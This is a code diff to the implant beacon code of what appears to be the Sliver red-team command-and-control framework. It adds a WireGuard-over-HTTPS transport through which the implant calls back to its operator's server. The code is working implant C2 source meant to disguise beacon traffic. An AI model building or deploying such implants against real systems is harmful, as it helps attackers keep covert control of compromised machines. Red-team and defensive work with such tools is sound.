@@ -53,6 +53,7 @@ import (
 	"net"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
+	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 
 	// {{end}}
@@ -158,6 +159,11 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 				// *** WG ***
 				// {{if .Config.IncludeWG}}
 				beacon = wgBeacon(uri)
+				// {{end}}  - IncludeWG
+				// {{if .Config.IncludeWG}}
+			case "wg+https":
+				// *** WG over HTTPS ***
+				beacon = wgBeaconWithHTTPBind(uri)
 				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
@@ -294,13 +300,29 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 // {{end}}
 
 // {{if .Config.IncludeWG}}
+// wgBeaconWithHTTPBind - A wg beacon over the wg-over-https bind.
+func wgBeaconWithHTTPBind(uri *url.URL) *Beacon {
+	bind := newWGHTTPBindForURL(uri)
+	return wgBeaconWithBind(uri, bind)
+}
+
+// wgBeacon - The wg beacon over the default UDP bind.
 func wgBeacon(uri *url.URL) *Beacon {
+	return wgBeaconWithBind(uri, nil)
+}
+
+// wgBeaconWithBind - The wg beacon through a specific bind.
+func wgBeaconWithBind(uri *url.URL, bind conn.Bind) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
-		lport = 53
+		if bind != nil {
+			lport = int(wireguard.DefaultWGHTTPSPort)
+		} else {
+			lport = 53
+		}
 	}
 
 	var conn net.Conn
@@ -320,7 +342,11 @@ func wgBeacon(uri *url.URL) *Beacon {
 				return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
 			}
 			hostname := addrs[0]
-			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
+			if bind == nil {
+				conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
+			} else {
+				conn, dev, err = wireguard.WGConnectWithBind(hostname, uint16(lport), bind)
+			}
 			if err != nil {
 				return err
 			}
